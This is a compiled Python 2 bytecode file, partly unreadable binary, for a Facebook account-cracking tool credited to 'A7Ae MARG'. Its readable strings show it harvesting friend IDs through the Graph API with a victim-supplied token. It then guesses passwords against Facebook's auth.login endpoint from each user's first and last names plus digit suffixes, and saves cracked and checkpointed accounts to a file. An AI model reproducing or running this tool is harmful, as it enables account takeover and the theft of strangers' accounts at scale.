ó
ÿc           @   s3  e  Z e r# d  d  Z   Z n  yÜ d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z Wn8 e k
 r9e j d  e j d  e j d  n Xe e  e j d	  e j   Z e j e   e j e j j   d
 d d g e _ d   Z  d   Z! d   Z" d   Z# d   Z$ d Z% d  Z& g  Z' g  Z( g  Z) g  a* g  Z+ g  Z, g  Z- d   Z. d   Z/ d   Z0 d   Z1 e2 d k r/e.   n  d S(   i    iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsers   pip2 install requestss   pip2 install mechanizes   python2 hcrack.pyt   utf8t   max_timei   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   100793623o.pyR      s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   100793623o.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   100793623o.pyR   $   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   100793623o.pyt   hamza.   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   R   R   R   (   R   R   (    (    s   100793623o.pyt   hopss3   s    sy  
[1;97m88888888ba   88b           d88  I8,        8        ,8I  
[1;97m88      "8b  888b         d888  `8b       d8b       d8'  
[1;97m88      ,8P  88`8b       d8'88   "8,     ,8"8,     ,8"   
[1;97m88aaaaaa8P'  88 `8b     d8' 88    Y8     8P Y8     8P    
[1;97m88aaaaaaP    88  `8b   d8'  88    `8b   d8' `8b   d8'    
[1;97m88      `8b  88   `8b d8'   88     `8a a8'   `8a a8'     
[1;97m88      a8P  88    `888'    88      `8a8'     `8a8'      
[1;97m88888888P"   88     `8'     88       `8'       `8'       

[1;97mCreated By A7Ae MARG !!

[1;97mMy Telegram : [1;97m@A7Ae_MARG

[1;97mMy Chanell  : [1;97m@A7AeMARG
 c           C   s.   t  j d  t GHHd GHd GHd GHHt   d  S(   Nt   clears   [1] Start Crackings
   [2] Updates   [3] join chanall telegram(   R   t   systemt   bannert   menu_action(    (    (    s   100793623o.pyt   menuT   s    c          C   sÎ   t  d  }  |  d k r4 d GHt j d  t   n |  d k rJ t   n |  d k r§ t j d  t GHHt d  t j d	  t d
  t j d  t j d  n# |  d k rÊ t j d  t   n  d  S(   Ns   Choose Option >>> R	   s   Wrong Inputi   t   1t   2R"   s   Please Wait.s   git pull origin masters   Tool Has Updatedi   s   python2 hop2.pyt   3s   xdg-open https://t.me/A7AeMARG(	   t	   raw_inputR   R   R&   t   crackR   R#   R$   R    (   t   act(    (    s   100793623o.pyR%   ]   s&    



c           C   s3   t  j d  t GHHd GHd GHd GHd GHHt   d  S(   NR"   s   [1] Crack From Friendlists   [2] Crack From Public IDs   [3] Crack From Files   [0] Back(   R   R#   R$   t
   crack_menu(    (    (    s   100793623o.pyR+   q   s    c             s  t  d  }  |  d k r' d GHt   nc|  d k rÀ t j d  t GHHt  d    t j d  t j d  t GHHt j d    } t	 j
 | j  } xð| d	 D] } t j | d
  q¢ WnÊ|  d k rÚt j d  t GHHt  d    t j d  t j d  t GHHt  d  } yC t j d | d    } t	 j
 | j  } t d | d  Wn' t k
 rd GHt  d  t   n Xt j d | d    } t	 j
 | j  } xÖ | d	 D] } t j | d
  q¼Wn° |  d k rht j d  t GHyC t  d  } x0 t | d  j   D] }	 t j |	 j    qWWqt k
 rdd GHt  d  t   qXn" |  d k r~t   n d GHt   t d t t t    t j d  t d  t j d  t d  t j d  Hd d  GH  f d!   }
 t d"  } | j |
 t  d# GHt d$  t d%  t t t   } t t t   } d& t t t   d' t t t   GHd d  GHt  d(  t   d  S()   Ns   Choose Option >>  R	   s   [!] Filled IncorrectlyR'   R"   s   Paste Token Here : i   s3   https://graph.facebook.com/me/friends?access_token=t   datat   idR(   s   [+] Input ID: s   https://graph.facebook.com/s   ?access_token=s(   [1;97m[ ] Account Name [1;97m:[1;97m t   names   [!] ID Not Found!s   
Press Enter To Back  s   /friends?access_token=R)   s   [+] File Name: t   rs   [!] File Not Found.s   Press Enter To Back. t   0s   Filled Incorrectlys   [ ] Total Friends: g      à?s!   [ ] The Process Has Been Started.s%   [!] To Stop Process Press CTRL Then Zi/   t   -c            s&  |  } y t  j d  Wn t k
 r* n Xyít j d | d    } t j | j  } d } t j	 d | d | d  } t j
 |  } d | k rÀ d	 | d
 | GHt j | |  nWd | d k r'd | d | GHt d d  } | j | d | d  | j   t j | |  nðd } t j	 d | d | d  } t j
 |  } d | k rd	 | d
 | GHt j | |  nd | d k ród | d | GHt d d  } | j | d | d  | j   t j | |  n$| d d }	 t j	 d | d |	 d  } t j
 |  } d | k r`d	 | d
 |	 GHt j | |	  n·d | d k rÇd | d |	 GHt d d  } | j | d |	 d  | j   t j | |	  nP| d d }
 t j	 d | d |
 d  } t j
 |  } d | k r4d	 | d
 |
 GHt j | |
  nãd | d k rd | d |
 GHt d d  } | j | d |
 d  | j   t j | |
  n|| d d } t j	 d | d | d  } t j
 |  } d | k rd	 | d
 | GHt j | |  nd | d k rod | d | GHt d d  } | j | d | d  | j   t j | |  n¨| d d } t j	 d | d | d  } t j
 |  } d | k rÜd	 | d
 | GHt j | |  n;d | d k rCd | d | GHt d d  } | j | d | d  | j   t j | |  nÔ | d d } t j	 d | d | d  } t j
 |  } d | k r°d	 | d
 | GHt j | |  ng d | d k rd | d | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   saves   https://graph.facebook.com/s   /?access_token=t
   1122334455s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens)   [1;32m[[1;32mSuccessful[1;32m][1;30m s    [1;97m|[1;30m s   www.facebook.comt	   error_msgs)   [1;97m[[1;97mCheckpoint[1;97m][1;97m s    [1;97m|[1;97m s   save/checkpoint.txtt   at   |s   
t
   1234512345t
   first_namet   1234t   123t   12345t   1122t	   last_name(   R   t   mkdirt   OSErrort   requestst   gett   jsont   loadst   textt   urllibt   urlopent   loadt   okst   appendt   openR   t   closet
   checkpoint(   t   argt   userR8   R   t   pass1R.   t   qt   crtt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   token(    s   100793623o.pyt   mainÆ   s¼    






i   s5   [1;97m----------------------------------------------s   [ ] Process Has Been Completed.s)   [1;97m[ ] Checkpoint IDS Has Been Saved.s'   [ ] Total [1;32mOK/[1;97mCP : [1;32ms   /[1;97ms   
Press Enter To Back (   R*   R-   R   R#   R$   R   R   RC   RD   RE   RF   RG   R/   RL   R    t   KeyErrorR+   RM   t	   readlinest   stript   IOErrorR&   R   R   R    t   mapRK   RO   (   t   crmR1   R   t   st   idtt   jokt   opR   t   idlistt   lineR\   t   pt   xxt   xxx(    (   R[   s   100793623o.pyR-   }   s    





	s

)	
t   __main__(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](3   t   Falset   foot   barR   R   R   t   datetimeR   t   hashlibt   ret	   threadingRE   RH   t	   cookielibt   getpasst	   mechanizeRC   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   ImportErrorR#   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    R!   R$   t   backt   threadst
   successfulRO   RK   t   gagalt   idhR/   R&   R%   R+   R-   t   __name__(    (    (    s   100793623o.pyt   <module>   sL   
¨
			
							Ë